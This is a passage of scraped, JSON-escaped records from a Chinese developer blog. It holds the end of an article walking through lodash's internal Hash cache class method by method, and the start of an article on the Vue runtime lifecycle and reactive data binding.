\u003ccode\u003e.internal\u003c/code\u003e 文件夹中，作为内部文件来使用。lodash 会根据不同的数据类型选择不同的缓存方式，\u003ccode\u003eHash\u003c/code\u003e 便是其中的一种方式，这种方式只能缓存 \u003ccode\u003ekey\u003c/code\u003e 的类型符合对象键要求的数据。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eHash\u003c/code\u003e 只接收一个二维数组作为参数，调用方式如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Hash([[\u003cspan class=\"hljs-string\"\u003e'tes1'\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e],[\u003cspan class=\"hljs-string\"\u003e'test2'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e],[\u003cspan class=\"hljs-string\"\u003e'test3'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e]])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其中子项中的第一项会作为 \u003ccode\u003ekey\u003c/code\u003e ，第二项是需要缓存的值。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eHash\u003c/code\u003e 实例化的结果如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e{\n  \u003cspan class=\"hljs-attr\"\u003esize\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e,\n  \u003cspan class=\"hljs-attr\"\u003e__data__\u003c/span\u003e: {\n    \u003cspan class=\"hljs-attr\"\u003etest1\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003etest2\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003etest3\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e缓存的数量储存在 \u003ccode\u003e__data__\u003c/code\u003e 的对象中。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eHash与Map\u003c/h2\u003e\n\u003cp\u003e后面将会讲到，除了使用 \u003ccode\u003eHash\u003c/code\u003e 方式缓存数据外，还会用到 \u003ccode\u003eMap\u003c/code\u003e，lodash 在设计 \u003ccode\u003eHash\u003c/code\u003e 的数据管理接口时，也与 \u003ccode\u003eMap\u003c/code\u003e 的接口一致，但是不会包含 \u003ccode\u003eMap\u003c/code\u003e 的遍历方法。\u003c/p\u003e\n\u003cp\u003e先来看看这些接口都有那些：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b450acc4027af?w=865\u0026amp;h=777\u0026amp;f=png\u0026amp;s=83935\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e源码\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e HASH_UNDEFINED = \u003cspan class=\"hljs-string\"\u003e'__lodash_hash_undefined__'\u003c/span\u003e\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eHash\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(entries) {\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e index = \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e length = entries == \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e ? \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e : entries.length\n\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.clear()\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (++index \u0026lt; length) {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e entry = entries[index]\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.set(entry[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e], entry[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e])\n    }\n  }\n  clear() {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__ = \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.create(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.size = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  }\n  \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e(key) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.has(key) \u0026amp;\u0026amp; \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__[key]\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.size -= result ? \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e : \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result\n  }\n  get(key) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e data = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = data[key]\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result === HASH_UNDEFINED ? \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e : result\n  }\n  has(key) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e data = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e data[key] !== \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e\n  }\n  set(key, value) {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e data = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.size += \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.has(key) ? \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e : \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n    data[key] = value === \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e ? HASH_UNDEFINED : value\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e\n  }\n}\n\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e Hash\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003econstructor\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(entries) {\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e index = \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e length = entries == \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e ? \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e : entries.length\n\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.clear()\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (++index \u0026lt; length) {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e entry = entries[index]\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.set(entry[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e], entry[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e])\n    }\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 \u003ccode\u003econstructor\u003c/code\u003e 中并没有看到初始化 \u003ccode\u003e__data__\u003c/code\u003e 属性和 \u003ccode\u003esize\u003c/code\u003e 属性，这个其实在 \u003ccode\u003eclear\u003c/code\u003e 方法中初始化了，后面会解释。\u003c/p\u003e\n\u003cp\u003e接着遍历传入的二维数组，调用 \u003ccode\u003eset\u003c/code\u003e 方法，初始化缓存的值。将子项的第一项作为 \u003ccode\u003ekey\u003c/code\u003e ，第二项为缓存的值。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eclear\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eclear() {\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__ = \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.create(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e)\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.size = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eclear\u003c/code\u003e 的作用是清空缓存，因此需要将 \u003ccode\u003esize\u003c/code\u003e 重置为 \u003ccode\u003e0\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e将缓存的数据 \u003ccode\u003e__data__\u003c/code\u003e 设置为空对象。\u003c/p\u003e\n\u003cp\u003e这里并没有用 \u003ccode\u003ethis.__data__ = {}\u003c/code\u003e 置空，而是调用了 \u003ccode\u003eObject.create\u003c/code\u003e 方法，并且将 \u003ccode\u003enull\u003c/code\u003e 作为参数。我们都知道， \u003ccode\u003eObject.create\u003c/code\u003e 的第一个参数为创建对象的原型对象，传入 \u003ccode\u003enull\u003c/code\u003e 的时候，返回的就是一个真空对象，即没有原型的对象，因此不会有原型属性的干扰，用来做缓存对象十分适合。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003ehas\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003ehas(key) {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e data = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e data[key] !== \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003ehas\u003c/code\u003e 用来判断是否已经有缓存数据，如果缓存数据已经存在，则返回 \u003ccode\u003etrue\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e判断也十分简单，只需要判断取出来的值是否为 \u003ccode\u003eundefined\u003c/code\u003e 即可。\u003c/p\u003e\n\u003cp\u003e这个判断有一个坑，后面会讲到。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eset\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eset(key, value) {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e data = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.size += \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.has(key) ? \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e : \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n  data[key] = value === \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e ? HASH_UNDEFINED : value\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eset\u003c/code\u003e 用来增加或者更新需要缓存的值。\u003ccode\u003eset\u003c/code\u003e 的时候需要同时维护 \u003ccode\u003esize\u003c/code\u003e 和在缓存的值。\u003c/p\u003e\n\u003cp\u003e首先调用 \u003ccode\u003ehas\u003c/code\u003e 方法，判断对应的 \u003ccode\u003ekey\u003c/code\u003e 是否已经被缓存过，如果已经缓存过，则 \u003ccode\u003esize\u003c/code\u003e 保持不变，否则 \u003ccode\u003esize\u003c/code\u003e 加 \u003ccode\u003e1\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e缓存值其实就是设置缓存对象 \u003ccode\u003ethis.__data__\u003c/code\u003e 对应 \u003ccode\u003ekey\u003c/code\u003e 属性的值。\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003ehas\u003c/code\u003e 中说到用 \u003ccode\u003edata[key] !== undefined\u003c/code\u003e 有一个坑，因为要缓存的值也可以是 \u003ccode\u003eundefined\u003c/code\u003e ，如果不做处理，肯定会导致判断错误。\u003c/p\u003e\n\u003cp\u003elodash 的处理方式是将 \u003ccode\u003eundefined\u003c/code\u003e 的值转换成 \u003ccode\u003eHASH_UNDEFINED\u003c/code\u003e ，也即一开始便定义的 \u003ccode\u003e__lodash_hash_undefined__\u003c/code\u003e 字符串来储存。\u003c/p\u003e\n\u003cp\u003e所以在缓存中，是用字符串 \u003ccode\u003e__lodash_hash_undefined__\u003c/code\u003e 来替代 \u003ccode\u003eundefined\u003c/code\u003e 的。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eset\u003c/code\u003e 在最后还将实例 \u003ccode\u003ethis\u003c/code\u003e 返回，以支持链式操作。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eget\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eget(key) {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e data = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = data[key]\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result === HASH_UNDEFINED ? \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e : result\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eget\u003c/code\u003e 方法是从缓存中取值。\u003c/p\u003e\n\u003cp\u003e取值其实就是返回缓存对象中对应 \u003ccode\u003ekey\u003c/code\u003e 的值即可。因为 \u003ccode\u003eundefined\u003c/code\u003e 在缓存中是以 \u003ccode\u003e__lodash_hash_undefined__\u003c/code\u003e 来表示的，因此遇到值为 \u003ccode\u003e__lodash_hash_undefined__\u003c/code\u003e 时，返回 \u003ccode\u003eundefined\u003c/code\u003e 。\u003c/p\u003e\n\u003cp\u003e其实这样还是有小小的问题的，如果需要缓存的值刚好是 \u003ccode\u003e__lodash_hash_undefined__\u003c/code\u003e，那取出来的值跟预设的就不一致了。但是这样情况应该很少出现吧。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003edelete\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e(key) {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e result = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.has(key) \u0026amp;\u0026amp; \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.__data__[key]\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.size -= result ? \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e : \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e result\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003edelete\u003c/code\u003e 方法用来删除指定 \u003ccode\u003ekey\u003c/code\u003e 的缓存。成功删除返回 \u003ccode\u003etrue\u003c/code\u003e， 否则返回 \u003ccode\u003efalse\u003c/code\u003e。 删除操作同样需要维护 \u003ccode\u003esize\u003c/code\u003e 属性和缓存值。\u003c/p\u003e\n\u003cp\u003e首先调用 \u003ccode\u003ehas\u003c/code\u003e 方法来判断缓存是否存在，如果存在，用 \u003ccode\u003edelete\u003c/code\u003e 操作符将 \u003ccode\u003e__data__\u003c/code\u003e 中对应的属性删除。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003edelete\u003c/code\u003e 操作符在成功删除属性时会返回 \u003ccode\u003etrue\u003c/code\u003e，如果成功删除，则需要将 \u003ccode\u003esize\u003c/code\u003e 减少 \u003ccode\u003e1\u003c/code\u003e 。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e参考\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"http://es6.ruanyifeng.com/#docs/set-map#Map\"\u003eSet 和 Map 数据结构\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create\"\u003eObject.create()\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 class=\"heading\"\u003eLicense\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://creativecommons.org/licenses/by-nc-nd/4.0/\"\u003e署名-非商业性使用-禁止演绎 4.0 国际 (CC BY-NC-ND 4.0)\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e最后，所有文章都会同步发送到微信公众号上，欢迎关注,欢迎提意见：  \u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/7/1602e879207eb857?w=430\u0026amp;h=430\u0026amp;f=jpeg\u0026amp;s=40267\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e作者：对角另一面\u003c/p\u003e\n","buildTime":"1514893750.3479","__v":0}
{"_id":{"$oid":"5a4b76348b69bb25d83da3db"},"id":"5a4b3cbb6fb9a045211f131d","author":{"$oid":"5a4b76338b69bb25d83da3cb"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/2/160b5e536bbf5f53?w=1200\u0026h=3039\u0026f=png\u0026s=63137","https://user-gold-cdn.xitu.io/2017/12/30/160a75c30eebb08d?w=894\u0026h=775\u0026f=png\u0026s=50703"],"screenShot":null}],"title":"大白话Vue源码系列(05)：运行时鸟瞰图","meta":{"likeCount":0},"tag":["Vue.js"],"comment":[],"shortContent":"Vue 运行时这一块是非常有意思的，不像 Vue 编译器那么枯燥，这里面有大量的实用技巧和设计思想可以学习。使用过 Vue 的小伙伴应该对 Vue 【响应的数据绑定】（也叫双向绑定）的印象非常深刻，在修改了数据之后，视图就会实时得到相应更新，这无疑极大地减轻了开发者的负担，使得…","content":"\u003cdiv id=\"catalog\"\u003e\u003c/div\u003e\n\u003cdiv style=\"max-width: 600px;margin: 0 auto;line-height: 2;padding: 1rem 2rem\" class=\"block-info\"\u003e\n    \u003cp\u003e研究 runtime\u003cbr\u003e\n        一边 Vue\u003cbr\u003e\n        一边源码\u003c/p\u003e\n    \u003cp\u003e初看 Vue 是 Vue\u003cbr\u003e\n        源码是源码\u003c/p\u003e\n    \u003cp\u003e再看 Vue 不是 Vue\u003cbr\u003e\n        源码不是源码\u003c/p\u003e\n    \u003cp\u003e再再看\u003cbr\u003e\n        Vue 是调用栈\u003cbr\u003e\n        源码也是调用栈\u003c/p\u003e\n    \u003cp style=\"text-align: right\"\u003e—— By DOM哥\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eVue 运行时这一块是非常有意思的，不像 Vue 编译器那么枯燥，这里面有大量的实用技巧和设计思想可以学习。使用过 Vue 的小伙伴应该对 Vue 【响应的数据绑定】（也叫双向绑定）的印象非常深刻，在修改了数据之后，视图就会实时得到相应更新，这无疑极大地减轻了开发者的负担，使得开发人员可以专注于处理业务逻辑和操作数据，也就是闻名遐迩的【数据驱动开发】。至于操作 DOM 更新视图这件苦脏累的活，Vue 已经帮你妥善处理完毕并且对你完全透明（意思是它就像空气一样你完全注意不到它，却又深度依赖它，离不开它）。\u003c/p\u003e\n\u003cp\u003eVue 运行时模块主要是围绕 Vue 实例的生命周期展开的，它涵盖了 Vue 实例生命周期内所需要的全部设施，包括实例创建，响应的数据绑定，挂载到 DOM 节点以及数据变化时自动更新视图等关键部分。本篇也将沿着 Vue 实例的生命周期路线，结合运行时关键实现伪代码，一步步清晰地描绘出 Vue 运行时的空中鸟瞰图。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003eVue 实例的生命周期\u003c/h1\u003e\n\u003cp\u003e本段的部分内容参考自 \u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/instance.html#%E5%AE%9E%E4%BE%8B%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F\"\u003eVue 官网的生命周期描述\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e就像每个人的生命周期有 \u003cstrong\u003e幼年\u003c/strong\u003e、\u003cstrong\u003e童年\u003c/strong\u003e、\u003cstrong\u003e少年\u003c/strong\u003e、\u003cstrong\u003e青年\u003c/strong\u003e、\u003cstrong\u003e中年\u003c/strong\u003e、\u003cstrong\u003e老年\u003c/strong\u003e，每个 Vue 实例的生命周期也有 \u003cstrong\u003ebeforeCreate\u003c/strong\u003e、\u003cstrong\u003ecreated\u003c/strong\u003e、\u003cstrong\u003ebeforeMount\u003c/strong\u003e、\u003cstrong\u003emounted\u003c/strong\u003e、\u003cstrong\u003ebeforeUpdate\u003c/strong\u003e、\u003cstrong\u003eupdated\u003c/strong\u003e、\u003cstrong\u003eactivated\u003c/strong\u003e、\u003cstrong\u003edeactivated\u003c/strong\u003e、\u003cstrong\u003ebeforeDestroy\u003c/strong\u003e、\u003cstrong\u003edestroyed\u003c/strong\u003e 等多个阶段。\u003c/p\u003e\n\u003cp\u003eVue 实例生命周期代码示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'index'\u003c/span\u003e\u0026gt;\u003c/span\u003e{{msg}}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Vue({\n    \u003cspan class=\"hljs-attr\"\u003eel\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'#index'\u003c/span\u003e,\n    \u003cspan class=\"hljs-attr\"\u003edata\u003c/span\u003e: {\n        \u003cspan class=\"hljs-attr\"\u003emsg\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'lifecycle'\u003c/span\u003e,\n    },\n\n    beforeCreate(){ \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'beforeCreate'\u003c/span\u003e)},\n    created(){ \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'created'\u003c/span\u003e)},\n    beforeMount(){ \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'beforeMount'\u003c/span\u003e)},\n    mounted(){ \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'mounted'\u003c/span\u003e)},\n})\n\n\u003cspan class=\"hljs-comment\"\u003e// Console output:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//      beforeCreate\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//      created\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//      beforeMount\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//      mounted\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e每个 Vue 实例在被创建时都要经过一系列的初始化过程，例如设置数据监听，编译 HTML 模板，将实例挂载到 DOM 等。在这个初始化的过程中会在特定的地方运行一些叫做【生命周期钩子】的函数，这些钩子其实就是开发者可以自定义的回调函数，如上面传入的 \u003ccode\u003ecreated\u003c/code\u003e 函数就会在 Vue 实例 created 时被调用。\u003c/p\u003e\n\u003cp\u003e下面一张图可以非常清晰地说明 Vue 各个生命周期钩子的调用时机（图片来自 Vue 官网\u003ca target=\"_blank\" href=\"https://cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA\"\u003e生命周期图示\u003c/a\u003e）：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/2/160b5e536bbf5f53?w=1200\u0026amp;h=3039\u0026amp;f=png\u0026amp;s=63137\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003carea\u003eVue 的生命周期图示\u003c/p\u003e\n\u003cp\u003e你不需要立马弄明白图上所有的东西，不过随着你的不断学习和使用，它的参考价值会越来越高。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e实例创建\u003c/h1\u003e\n\u003cp\u003e众所周知 Vue 是通过 \u003ccode\u003enew Vue()\u003c/code\u003e 的方式进行使用的，也就是说 Vue 内部将自己封装成了一个类。然而 Vue 并没有使用 ES6 最新的 \u003ccode\u003eclass\u003c/code\u003e 方式进行实现，而是用了原来 prototype 那一套，这是让宝宝有些伤心的。闲话待会再叙，先看一下源码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// vue/src/core/instance/index.js\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eVue\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eoptions\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._init(options)\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eVue 将初始化工作全部放在了 \u003ccode\u003eVue.prototype._init()\u003c/code\u003e 方法里。去伪存真，\u003ccode\u003e_init\u003c/code\u003e 方法主代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// vue/src/core/instance/init.js\u003c/span\u003e\nVue.prototype._init = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eoptions\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e vm = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e\n\n    vm.$options = mergeOptions(options || {})\n\n    initEvents(vm)\n    initRender(vm)\n    callHook(vm, \u003cspan class=\"hljs-string\"\u003e'beforeCreate'\u003c/span\u003e)\n    initState(vm)\n    callHook(vm, \u003cspan class=\"hljs-string\"\u003e'created'\u003c/span\u003e)\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (vm.$options.el) {\n        vm.$mount(vm.$options.el)\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003einitEvents\u003c/code\u003e 和 \u003ccode\u003einitRender\u003c/code\u003e 函数主要用来初始化 Vue 实例的一些容器字段，现在可暂时忽略它们。接下来重点来了，在 \u003ccode\u003einitState\u003c/code\u003e 函数中封装了实现【响应的数据绑定】的关键代码，虽然这不是 Vue 最流弊的部分，但却是咱对 Vue 最好奇的地方，也是咱开始本源码系列的最初动力。在 \u003ccode\u003einitState\u003c/code\u003e 之前和之后分别调用了 Vue 的生命周期钩子函数 \u003ccode\u003ebeforeCreate\u003c/code\u003e 和 \u003ccode\u003ecreated\u003c/code\u003e，接下来看看 Vue 是如何实现响应的数据绑定的。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e响应的数据绑定\u003c/h1\u003e\n\u003cp\u003e响应的数据绑定并不是 Vue 独创的，而是 \u003ca target=\"_blank\" href=\"http://www.cnblogs.com/iovec/p/7840228.html\"\u003eMVVVM 模式\u003c/a\u003e理论的一部分，它是 View 层和 ViewModel 层的连接方式。如下图所示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg 